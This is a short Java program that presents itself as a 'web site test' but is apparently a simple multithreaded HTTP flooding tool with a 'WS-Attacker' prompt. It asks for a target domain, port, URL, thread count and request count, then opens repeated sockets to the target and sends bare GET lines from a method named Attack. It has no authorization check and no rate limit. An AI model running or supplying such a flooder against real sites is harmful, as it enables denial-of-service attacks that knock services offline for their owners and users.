

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class webSiteTest {

    public static int sendNum = 1;

    public static void webTest() {
        try {
            //get the number of the attacker.
            Scanner scanner = new Scanner(System.in);
            System.out.print("WS-Attacker / Web_Test_> Enter Thread Number: ");
            int testAttackerNum = Integer.valueOf(scanner.nextLine());
            //get the num,ber of the send requests
            Scanner scanner1 = new Scanner(System.in);
            System.out.print("WS-Attacker / Web_Test_> Enter Send Requests Number: ");
            int testSendNum = Integer.valueOf(scanner1.nextLine());
            Scanner scanner2 = new Scanner(System.in);
            System.out.print("WS-Attacker / Web_Test_> Enter Test Domain: ");
            String domain = scanner2.nextLine();
            Scanner scanner3 = new Scanner(System.in);
            System.out.print("WS-Attacker / Web_Test_> Enter Test Domain's Port: ");
            int port = Integer.valueOf(scanner2.nextLine());
            System.out.print("WS-Attacker / Web_Test_> Enter Test URL: ");
            Scanner scanner4 = new Scanner(System.in);
            String url = scanner4.nextLine();

            for (int i=0;i < testAttackerNum ;i++) {
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        for (int i=0;i < testSendNum/testAttackerNum;i++) {
                            sendNum++;
                            webSiteTest.Attack(testSendNum,domain,port,url);
                            System.out.println("[!] Test: "+domain+" "+ i);
                        }
                    }
                });
                thread.start();
            }

        }catch (Exception exception) {
            System.out.println("[!] Must enter a int number!");
        }
    }
    public static void Attack(int sendNum,String domain,int port,String url) {
        try {
            Socket socket = new Socket(domain,port);
            OutputStream outputStream = socket.getOutputStream();
            InputStream inputStream = socket.getInputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            printWriter.println("GET "+url+" HTTP/1.1");
            printWriter.flush();
            socket.close();

        }catch (Exception exception) {
            System.out.println(exception.getLocalizedMessage());
            System.exit(0);
        }
    }
}
